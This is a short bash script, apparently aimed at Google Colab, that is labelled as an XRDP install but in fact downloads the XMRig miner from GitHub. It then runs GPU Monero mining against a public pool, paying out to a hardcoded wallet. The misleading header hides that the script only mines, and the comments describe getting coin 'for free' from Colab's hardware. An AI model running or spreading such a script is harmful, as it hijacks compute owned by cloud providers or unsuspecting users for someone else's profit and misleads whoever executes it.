#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xvzf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig --cuda -o us-west.minexmr.com:443 -u 83E1wMxD3E1BANKq1wLGGu9hXvMCswAvP1JhGMG8SMWN12uD99qNjSTWtXemKPgmpsHqERzKwpgyBEczr9EC4nUdFsh31yy -k --tls --rig-id GC-US
